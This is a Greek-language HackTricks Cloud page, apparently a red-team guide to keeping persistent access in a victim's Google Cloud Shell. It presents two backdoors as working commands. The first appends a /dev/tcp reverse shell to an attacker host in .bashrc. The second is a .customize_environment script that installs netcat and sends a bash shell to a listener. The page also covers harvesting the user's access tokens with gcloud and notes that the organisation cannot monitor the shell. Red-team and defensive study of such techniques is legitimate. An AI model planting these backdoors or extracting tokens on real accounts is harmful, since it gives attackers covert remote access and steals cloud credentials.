# GCP - Μόνιμη Ανθεκτικότητα Cloud Shell

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Cloud Shell

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Μόνιμη Πίσω Πόρτα

Το [**Google Cloud Shell**](https://cloud.google.com/shell/) σας παρέχει πρόσβαση στη γραμμή εντολών στους πόρους σας στο cloud απευθείας από τον περιηγητή σας χωρίς καμία σχετική χρέωση.

Μπορείτε να έχετε πρόσβαση στο Cloud Shell της Google από τη **web κονσόλα** ή εκτελώντας το **`gcloud cloud-shell ssh`**.

Αυτή η κονσόλα έχει μερικές ενδιαφέρουσες δυνατότητες για επιτιθέμενους:

1. **Οποιοσδήποτε χρήστης της Google με πρόσβαση στο Google Cloud** έχει πρόσβαση σε ένα πλήρως πιστοποιημένο παράδειγμα Cloud Shell (οι λογαριασμοί υπηρεσιών μπορούν, ακόμα και αν είναι Ιδιοκτήτες του οργανισμού).
2. Το συγκεκριμένο παράδειγμα θα **διατηρήσει τον κατάλογο του αρχικού χρήστη του για τουλάχιστον 120 ημέρες** αν δεν υπάρξει καμία δραστηριότητα.
3. Δεν υπάρχουν **δυνατότητες για έναν οργανισμό να παρακολουθήσει** τη δραστηριότητα αυτού του παραδείγματος.

Αυτό σημαίνει βασικά ότι ένας επιτιθέμενος μπορεί να τοποθετήσει μια πίσω πόρτα στον κατάλογο του χρήστη και όσο ο χρήστης συνδέεται στο GC Shell κάθε 120 ημέρες τουλάχιστον, η πίσω πόρτα θα επιβιώσει και ο επιτιθέμενος θα λάβει ένα κέλυφος κάθε φορά που το εκτελεί απλά κάνοντας:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Υπάρχει ένα άλλο αρχείο στον φάκελο home που ονομάζεται **`.customize_environment`** που, αν υπάρχει, θα **εκτελείται κάθε φορά** που ο χρήστης έχει πρόσβαση στο **cloud shell** (όπως στην προηγούμενη τεχνική). Απλά εισάγετε την προηγούμενη πίσω πόρτα ή μια παρόμοια για να διατηρήσετε την επιμονή όσο ο χρήστης χρησιμοποιεί "συχνά" το cloud shell:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Είναι σημαντικό να σημειωθεί ότι **την πρώτη φορά που εκτελείται μια ενέργεια που απαιτεί πιστοποίηση**, εμφανίζεται ένα παράθυρο εξουσιοδότησης pop-up στον περιηγητή του χρήστη. Αυτό το παράθυρο πρέπει να γίνει αποδεκτό πριν εκτελεστεί η εντολή. Αν εμφανιστεί ένα απροσδόκητο pop-up, μπορεί να προκαλέσει υποψίες και ενδεχομένως να θέσει σε κίνδυνο τη μέθοδο διατήρησης που χρησιμοποιείται.
{% endhint %}

Αυτό είναι το pop-up από την εκτέλεση της εντολής `gcloud projects list` από το cloud shell (ως επιτιθέμενος) που προβάλλεται στη συνεδρία χρήστη του περιηγητή:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Ωστόσο, αν ο χρήστης έχει χρησιμοποιήσει ενεργά το cloudshell, το pop-up δεν θα εμφανιστεί και μπορείτε να **συγκεντρώσετε τα τεκμήρια του χρήστη με**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### Πώς γίνεται η σύνδεση SSH

Βασικά, χρησιμοποιούνται αυτές οι 3 κλήσεις API:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (θα σας κάνει να προσθέσετε το δημόσιο κλειδί που δημιουργήσατε τοπικά)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (θα σας κάνει να ξεκινήσετε την εικονική μηχανή)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (θα σας πει τη διεύθυνση IP του Google Cloud Shell)

Ωστόσο, μπορείτε να βρείτε περισσότερες πληροφορίες στο [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Αναφορές

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)
